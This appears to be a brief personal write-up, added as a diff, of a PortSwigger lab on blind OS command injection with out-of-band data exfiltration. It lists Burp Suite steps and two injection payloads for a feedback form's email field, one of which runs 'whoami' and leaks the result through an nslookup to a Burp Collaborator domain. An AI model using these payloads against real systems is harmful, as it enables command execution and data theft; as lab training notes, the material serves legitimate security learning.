@@ -1,0 +1,12 @@
+lab : https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration
+
+while you can't redirect our command result to another file we can do it
+by out of banding the result to other netword (a website that we have access to it)
+
+steps :
+steps :
+1-sending the post request of sending feedback to burp suite repeater
+2-find the vulnirable parameter by adding ||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN|| in every parameters
+3-the email parameter is the vulnirable one
+4-we add the valur ||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN|| in the email section
+which means to redirect the whoami command result to the domain that we have access to
